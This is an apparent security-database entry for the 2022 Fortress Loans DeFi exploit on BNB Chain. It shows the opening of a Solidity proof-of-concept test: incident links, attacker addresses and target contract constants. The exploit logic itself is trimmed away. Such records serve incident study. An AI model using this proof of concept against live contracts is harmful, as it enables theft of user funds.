# [?] Fortress Loans - Malicious Proposal & Price Oracle Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: FortressLoans
Published: 2022-05-08
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/FortressLoans_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC20, IPriceFeed, IPancakeRouter, IUnitroller, IVyper} from "../interface.sol";

/* @KeyInfo -- Total Lost : 1,048 ETH + 400,000 DAI (~3,000,000 US$)
    Attacker Wallet : https://bscscan.com/address/0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad
    Attacker Contract : https://bscscan.com/address/0xcd337b920678cf35143322ab31ab8977c3463a45
    Fortress PriceOracle : https://bscscan.com/address/0x00fcf33bfa9e3ff791b2b819ab2446861a318285#code
    Chain Contract : https://bscscan.com/address/0xc11b687cd6061a6516e23769e4657b6efa25d78e#code
    Fortress Governor Alpha : https://bscscan.com/address/0xe79ecdb7fedd413e697f083982bac29e93d86b2e#code
    Price Feed : https://bscscan.com/address/0xaa24b64c9b44d874368b09325c6d60165c4b39f2#code
*/

/* @News
    Official Announce : https://mobile.twitter.com/Fortressloans/status/1523495202115051520
    PeckShield Alert Thread : https://twitter.com/PeckShieldAlert/status/1523489670323404800
    Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1523530484877209600
*/

/* @Reports
    CertiK Incident Analysis : https://www.certik.com/resources/blog/k6eZOpnK5Kdde7RfHBZgw-fortress-loans-exploit
    Anquanke Incident Analysis : https://www.anquanke.com/post/id/273207
    Freebuf Incident Analysis : https://www.freebuf.com/articles/blockchain-articles/332879.html
    Learnblockchain.cn Analysis :  https://learnblockchain.cn/article/4062
*/

address constant attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
address constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;
address constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
address constant fFTS = 0x854C266b06445794FA543b1d8f6137c35924C9EB;
address constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;
address constant ChainContract = 0xc11B687cd6061A6516E23769E4657b6EfA25d78E;
address constant FortressPriceOracle = 0x00fcF33BFa9e3fF791b2b819Ab2446861a318285;
address constant PriceFeed = 0xAa24b64C9B44D874368b09325c6D60165c4B39f2;
address constant Unitroller = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/FortressLoans_exp.sol_
